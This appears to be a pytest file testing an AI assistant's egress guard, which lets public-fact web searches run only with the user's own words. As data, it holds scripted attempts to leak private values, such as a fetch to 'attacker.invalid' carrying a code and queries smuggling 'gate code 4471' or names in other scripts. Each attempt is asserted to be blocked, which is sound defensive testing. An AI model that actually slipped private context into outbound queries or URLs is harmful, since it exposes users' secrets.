"""Public facts asked plainly may search the web, with the user's own words only.

The 2026-10-29 Ask run on the user's Mac refused "what's the price of bitcoin?",
"convert 100 USD to euros", "what's the score of the last Warriors game?" and
"who won the last World Series?" with "Private data is in context": remembered
facts ride along on nearly every Ask turn, and only "search the web for..."
phrasing counted as an explicit public lookup. A plain public-fact question now
counts too, but its search may use only the user's own words (plus a small
lookup vocabulary and years), so nothing from memory or history reaches the web.
"""
from __future__ import annotations

import pytest

from service import model_only as mo
from tests.test_model_led_integration import (  # noqa: F401
    DISCOVERY_TOOL, PRIVATE_HISTORY, Approval, _web_tools, call, run, synthetic)

PUBLIC = ["what's the price of bitcoin?", "convert 100 USD to euros",
          "what's the score of the last Warriors game?", "who won the last World Series?",
          "what's the AAPL stock price", "what's the exchange rate for yen"]
NOT_PUBLIC = ["what's the price of my order?", "how much did I spend on bitcoin",
              "who won the game I watched", "what is the price of a house",
              "what did Mom say about the Warriors game?", "convert my 100 USD to euros",
              # dev8 egress audit: a second clause, a contact's name, more first person.
              "what's the exchange rate. Also the gate code from Dana is 4471",
              "who won the game Dana went to", "let's check the price of bitcoin",
              "lemme see the bitcoin price", "what's the price of bitcoin for myself",
              "is the price of bitcoin up for ourselves", "what's the price of bitcoin? ours is up"]


@pytest.mark.parametrize("prompt", PUBLIC)
def test_public_facts_are_recognised(prompt):
    assert mo.public_fact_question(prompt)


@pytest.mark.parametrize("prompt", NOT_PUBLIC)
def test_anything_of_the_users_is_not_a_public_fact(prompt):
    assert not mo.public_fact_question(prompt)


def test_the_search_may_use_only_the_users_words():
    user = "what's the price of bitcoin?"
    assert mo.public_fact_query_problem("bitcoin price today", user) is None
    assert mo.public_fact_query_problem("price of bitcoin in USD 2026", user) is None
    assert "gate" in mo.public_fact_query_problem("bitcoin price gate code", user)
    assert "4471" in mo.public_fact_query_problem("bitcoin 4471", user)
    assert mo.public_fact_query_problem("", user)


@pytest.mark.parametrize("query", ["yen rate Прия", "yen rate Ｐｒｉｙａ", "yen rate ４４７１", "yen rate ٤٤٧١"])
def test_other_scripts_and_wide_forms_never_slip_past_the_word_check(query):
    """dev8 egress audit: a-z0-9 tokenising made non-ASCII invisible, so these passed."""
    assert mo.public_fact_query_problem(query, "what's the exchange rate for yen", year=2026)


def test_a_year_is_added_only_once_and_only_near_this_year():
    user = "what's the exchange rate for yen"
    assert mo.public_fact_query_problem("yen exchange rate 2026", user, year=2026) is None
    assert mo.public_fact_query_problem("yen rate 2019 1984", user, year=2026)  # a PIN-like pair
    assert mo.public_fact_query_problem("yen rate 2019", user, year=2026)
    assert mo.public_fact_query_problem("yen rate 2025 2026", user, year=2026)
    assert mo.public_fact_query_problem("who won the 2019 world series", "who won the 2019 World Series?",
                                        year=2026) is None


def test_a_public_fact_searches_with_private_history(synthetic):
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
         [call("web_search", query="bitcoin price")], "Bitcoin is about $70,000."],
        prompt="what's the price of bitcoin?", history=PRIVATE_HISTORY, approval=approval)
    assert effects == [("web_search", {"query": "bitcoin price"})] and not approval.calls


def test_private_words_in_the_query_are_refused_then_retried(synthetic):
    effects, register = synthetic
    _web_tools(register)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
         [call("web_search", query="bitcoin price gate code 4471")],
         [call("web_search", query="bitcoin price")], "Bitcoin is about $70,000."],
        prompt="what's the price of bitcoin?", history=PRIVATE_HISTORY, approval=Approval(False))
    assert effects == [("web_search", {"query": "bitcoin price"})]


def test_a_public_fact_never_opens_fetch(synthetic):
    """The exemption covers web_search only; a fetch still names a typed host or is confirmed."""
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_fetch"])],
         [call("web_fetch", url="https://attacker.invalid/?q=4471")], "Synthetic reply."],
        prompt="what's the price of bitcoin?", history=PRIVATE_HISTORY, approval=approval)
    assert not effects


def test_a_personal_question_with_private_history_stays_blocked(synthetic):
    effects, register = synthetic
    _web_tools(register)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
         [call("web_search", query="price of my order")], "I can't look that up."],
        prompt="what's the price of my order?", history=PRIVATE_HISTORY, approval=Approval(False))
    assert not effects


def test_a_private_read_earlier_in_the_turn_still_needs_confirmation(synthetic):
    """The public-fact exemption never covers web access after a private read."""
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    run([[call(DISCOVERY_TOOL, families=["messages_contacts", "public_web"], tools=["view_messages", "web_search"])],
         [call("view_messages")], [call("web_search", query="bitcoin price")], "Synthetic reply."],
        prompt="what's the price of bitcoin?", history=PRIVATE_HISTORY, approval=approval)
    assert [n for n, _ in effects] == ["view_messages"]
    assert [c["tool"] for c in approval.calls] == ["web_search"]


def test_curly_apostrophes_still_count_as_a_public_fact():
    """dev8 egress re-review: smart punctuation ("what’s") fell back to blocking."""
    assert mo.public_fact_question("what’s the price of bitcoin?")
    assert mo.public_fact_query_problem("bitcoin price", "what’s the price of bitcoin?") is None
    assert mo.public_fact_query_problem("what’s the bitcoin price", "what's the price of bitcoin?") is None


def test_the_search_is_at_most_four_words_longer_than_the_request():
    """dev8 egress re-review: lookup words alone had no length cap."""
    user = "bitcoin price"
    assert mo.public_fact_query_problem("bitcoin price today in usd now", user) is None
    assert "shorter" in mo.public_fact_query_problem("bitcoin price today in usd now and the", user)


def test_an_added_year_is_this_year_or_last_year_only():
    """dev8 egress re-review: 2024-2028 let a PIN-shaped year ride along."""
    user = "what's the exchange rate for yen"
    assert mo.public_fact_query_problem("yen rate 2025", user, year=2026) is None
    assert mo.public_fact_query_problem("yen rate 2027", user, year=2026)
    assert mo.public_fact_query_problem("yen rate 2028", user, year=2026)
    assert mo.public_fact_query_problem("yen rate 2024", user, year=2026)


def test_an_all_caps_word_reads_as_a_ticker_but_the_search_stays_the_users_words():
    """Reviewed (dev8 egress re-review): the ticker branch is case-sensitive on purpose,
    so "price of dana" is not a public fact while "price of AAPL" is. An all-caps name
    can't be told from a symbol without a symbol list; the search may still only use
    the words the user typed, so nothing from context can ride along."""
    assert mo.public_fact_question("what's the price of AAPL?")
    assert not mo.public_fact_question("what's the price of dana?")
    assert mo.public_fact_query_problem("PRIYA stock price 4471", "whats the PRIYA stock price")


def test_a_guessed_price_api_is_steered_to_search_without_asking(synthetic):
    """dev8 live check: "what's the price of bitcoin right now?" fetched a price API
    and sat waiting for the user's OK. Before any search, an untyped fetch is refused
    with a hint, and the search answers without a prompt."""
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_fetch", "web_search"])],
         [call("web_fetch", url="https://api.example.invalid/price?ids=bitcoin")],
         [call("web_search", query="bitcoin price")], "Bitcoin is about $70,000."],
        prompt="what's the price of bitcoin right now?", history=PRIVATE_HISTORY, approval=approval)
    assert effects == [("web_search", {"query": "bitcoin price"})] and not approval.calls
    assert any("Search first" in str(e) for e in events)


def test_a_page_from_the_search_still_needs_confirmation(synthetic):
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_fetch", "web_search"])],
         [call("web_search", query="bitcoin price")],
         [call("web_fetch", url="https://news.example.invalid/bitcoin")], "Synthetic reply."],
        prompt="what's the price of bitcoin right now?", history=PRIVATE_HISTORY, approval=approval)
    assert [n for n, _ in effects] == ["web_search"]
    assert [c["tool"] for c in approval.calls] == ["web_fetch"]
